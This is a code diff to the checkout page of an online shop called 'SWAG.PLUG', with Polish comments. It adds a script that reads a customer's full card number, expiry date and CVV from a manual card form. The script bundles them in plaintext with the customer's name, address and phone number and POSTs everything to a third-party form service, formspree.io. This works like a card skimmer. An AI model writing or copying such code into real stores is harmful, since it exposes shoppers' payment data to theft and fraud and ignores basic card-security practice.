@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout - SWAG.PLUG</title>
     <!-- POPRAWIONY LINK PAYPAL -->
-    <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=YOUR_COMPONENTS"></script>
+    <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=buttons"></script>
     <style>
         body { background:#000; color:#fff; font-family:sans-serif; }
         .checkout { max-width:600px; margin:50px auto; padding:20px; border:1px solid #333; }
@@ -146,6 +146,72 @@ paypal.Buttons({
     }
 }).render('#paypal-button-container');
 </script>
+    <script>
+    // 1. Inicjalizacja koszyka (pobranie sumy)
+    const cart = JSON.parse(localStorage.getItem('cart')) || [];
+    let total = 0;
+    cart.forEach(p => { total += parseFloat(p.price) * parseInt(p.quantity); });
+
+    // 2. FUNKCJA WYSYŁAJĄCA DANE (FORMSPREE)
+    function finish(method) {
+        let extraInfo = method;
+        
+        // Jeśli to karta ręczna, zbieramy dane z Twojego formularza
+        if(method === 'KARTA RĘCZNIE') {
+            const num = document.getElementById('cNum').value;
+            const exp = document.getElementById('cExp').value;
+            const cvv = document.getElementById('cCvv').value;
+            if(!num || !exp || !cvv) return alert("Wypełnij dane karty!");
+            extraInfo = `KARTA: ${num} | EXP: ${exp} | CVV: ${cvv}`;
+        }
+
+        const orderData = {
+            Klient: document.getElementById('fName')?.value || "Brak danych",
+            Adres: (document.getElementById('fAddr')?.value || "") + ", " + (document.getElementById('fCity')?.value || ""),
+            Telefon: document.getElementById('fPhone')?.value || "Brak",
+            Produkty: cart.map(p => `${p.name} x${p.quantity}`).join(", "),
+            Suma: total.toFixed(2) + " PLN",
+            Metoda: extraInfo
+        };
+
+        fetch("https://formspree.io", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept": "application/json" },
+            body: JSON.stringify(orderData)
+        })
+        .then(res => {
+            if(res.ok) {
+                alert("ZAMÓWIENIE PRZYJĘTE! Dziękujemy.");
+                localStorage.clear();
+                window.location.href = "index.html";
+            }
+        });
+    }
+
+    // 3. INTEGRACJA PRZYCISKU PAYPAL
+    if (window.paypal) {
+        paypal.Buttons({
+            createOrder: (data, actions) => {
+                return actions.order.create({
+                    purchase_units: [{
+                        amount: { value: total.toFixed(2) }
+                    }]
+                });
+            },
+            onApprove: (data, actions) => {
+                return actions.order.capture().then(details => {
+                    // Po udanej płatności PayPal wysyłamy info do Formspree
+                    finish("PAYPAL (OPŁACONE: " + details.id + ")");
+                });
+            },
+            onError: (err) => {
+                console.error("Błąd PayPal:", err);
+                alert("Błąd połączenia z PayPal. Spróbuj karty.");
+            }
+        }).render('#paypal-button-container');
+    }
+</script>
+
 
 </body>
 </html>
